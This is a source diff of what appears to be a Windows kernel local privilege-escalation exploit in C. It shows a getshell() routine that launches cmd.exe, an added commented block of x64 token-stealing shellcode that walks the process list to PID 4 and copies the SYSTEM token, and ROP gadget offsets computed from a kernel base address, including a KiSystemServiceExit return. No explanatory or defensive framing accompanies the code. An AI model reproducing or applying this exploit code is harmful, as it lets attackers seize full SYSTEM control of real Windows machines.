@@ -19,11 +19,38 @@ void getshell() {
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 	printf("GO\n");
-	printf("fuck");
 	system("C:\\Windows\\System32\\cmd.exe");
-	printf("fuck");
 }
 
+
+/*
+    mov r9,qword ptr gs:[0x188]
+    mov r12,rax
+    mov r10,r9
+    mov word ptr [r9+0x1e4],0 #KernelApcDisable
+    mov r9, qword ptr [r9+0x220] #kproc
+    mov rax, r9
+
+    mov rcx,rax
+    lea rcx,qword ptr [rcx+0x360]
+    mov rax,r9
+loop:
+    mov rax,qword ptr [rax+0x2f0]
+    lea rax,qword ptr [rax-0x2f0]
+    cmp word ptr [rax+0x2e8],4
+    jne loop
+    mov rdx,rax
+    lea rdx,qword ptr [rdx+0x360]
+
+    mov rdx,qword ptr [rdx]
+    mov qword ptr [rcx],rdx
+    mov r11,0x202
+    mov rcx,r12   #prepare for recovering nx bit at pml4
+    mov rdx,0x8a
+    xor rsi, rsi
+    xor rdi, rdi
+    ret
+*/
 
 void* shellcode() {
 	void* lpAddress = NULL;
@@ -97,11 +124,10 @@ int main()
 	size_t pop_rdx = kaddr + 0x80f582;
 	size_t add_rax_rdx = kaddr + 0x80f4b;
 	size_t mov_rcx_rax = kaddr + 0x28df80; //mov rcx, rax ; mov rsi, qword [rsp+0x40] ; mov rax, rcx ; add rsp, 0x30 ; pop rdi ; ret
-	size_t kisysret = kaddr + 0x351d8e; //KiSystemServiceExit
 	size_t pop_rbp = kaddr + 0x86d0c7;
 	size_t pop_r8 = kaddr + 0x12c8cf;
 
-	size_t systemserviceexit = kaddr + 0x1d2b15;
+	size_t systemserviceexit = kaddr + 0x1d2b15; //KiSystemServiceExit
 
 
 
